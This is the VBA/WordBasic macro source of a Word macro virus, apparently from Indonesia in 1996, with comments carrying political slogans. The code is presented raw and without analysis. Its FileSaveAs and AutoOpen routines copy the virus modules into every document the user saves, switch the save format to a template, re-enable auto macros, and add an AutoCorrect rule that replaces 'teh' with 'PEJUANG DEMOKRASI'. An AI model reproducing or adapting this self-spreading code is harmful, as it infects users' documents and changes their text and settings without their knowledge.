   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Perjuangan"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo SETOP
   WordBasic.ToolsAutoCorrect InitialCaps:=1, SentenceCaps:=1, Days:=17, CapsLock:=1, ReplaceText:=1, Formatting:=0, Replace:="teh", With:="PEJUANG DEMOKRASI", Add:=1, SmartQuotes:=1
   WordBasic.ToolsAutoCorrect InitialCaps:=1, SentenceCaps:=1, Days:=17, CapsLock:=1, ReplaceText:=1, Formatting:=0, Replace:="teh", With:="PEJUANG DEMOKRASI", SmartQuotes:=1
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Revolusi", sTMacro$
   sTMacro$ = sMe$ + ":Revolusi"
   WordBasic.MacroCopy "Global:Revolusi", sTMacro$
   sTMacro$ = sMe$ + ":Perjuangan"
   WordBasic.MacroCopy "Global:Perjuangan", sTMacro$
   sTMacro$ = sMe$ + ":Public"
   WordBasic.MacroCopy "Global:Public", sTMacro$


   WordBasic.FileSaveAs dlg
   GoTo Done

   SETOP:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   Done:

   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Lungo
   WordBasic.ToolsAutoCorrect InitialCaps:=1, SentenceCaps:=1, Days:=17, CapsLock:=1, ReplaceText:=1, Formatting:=0, Replace:="teh", With:="PEJUANG DEMOKRASI", Add:=1, SmartQuotes:=1
   WordBasic.ToolsAutoCorrect InitialCaps:=1, SentenceCaps:=1, Days:=17, CapsLock:=1, ReplaceText:=1, Formatting:=0, Replace:="teh", With:="PEJUANG DEMOKRASI", SmartQuotes:=1
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.DisableAutoMacros 0
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs", 1
   WordBasic.MacroCopy "Global:Revolusi", WordBasic.[WindowName$]() + ":Revolusi", 1
   WordBasic.MacroCopy "Global:Perjuangan", WordBasic.[WindowName$]() + ":Perjuangan", 1
   WordBasic.MacroCopy "Global:Public", WordBasic.[WindowName$]() + ":Public", 1
   WordBasic.FileSaveAs dlg
   GoTo Lungo
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   Lungo:
   End Sub

   Attribute VB_Name = "ModulePublic"

   Public Sub MAIN()
   Rem PEJUANG  DEMOKRASI
           Rem YOGYAKARTA 96
           Rem PESAN INI UNTUK MENGETUK HATI NURANI RAKYAT
           Rem MARI BERJUANG BERSAMA KAMI
           Rem TEGAKKAN KEADILAN YANG TELAH DIINJAK-INJAK
           Rem  UNDERGROUND PUBLIC MESSAGES
           Rem    !!!!!!!!!!!!!!!!!!!!!!!!!
   Rem GepenkUajy96
   End Sub
